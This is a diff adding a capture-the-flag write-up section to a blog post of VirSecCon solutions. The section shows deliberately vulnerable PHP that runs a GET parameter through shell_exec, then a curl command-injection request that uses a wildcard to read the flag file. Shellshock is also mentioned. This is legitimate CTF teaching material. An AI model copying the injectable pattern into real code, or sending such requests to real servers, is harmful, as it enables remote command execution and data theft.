@@ -11,6 +11,31 @@ navigation: True
 
 In this post, I will be showing my solutions from `VirSecCon`, it was a nice experince. Notice that I only spend copule of hours. I may add couple of other solutions from Web challenges. Thanks `John` for a nice experince.
 
+### Web Shell : Web Challenge
+
+Here is the source code for the challenges
+```php
+<?php
+
+    $c = $_GET[c];
+
+    if(strlen($c) < 10){
+            echo shell_exec($c);
+    }else{
+            echo "too long!";
+    }
+    highlight_file(__FILE__);
+?>
+
+```
+
+We have limited to 10 characters limt. so if we try: `http://jh2i.com:50001/?c=cat+flag.txt` we will be exceeding the 10 chars limit. However, we can use `linux wildcards` to read the flag as
+
+```sh
+curl http://jh2i.com:50001/?c=cat+flag*
+
+LLS{you_really_can_see_in_the_dark}
+```
 
 ### Crush : Web Challenge
 It was a hint in the website about this vulnerability, then found the `crush.sh` file. It is seems to be a `shellshock exploit`
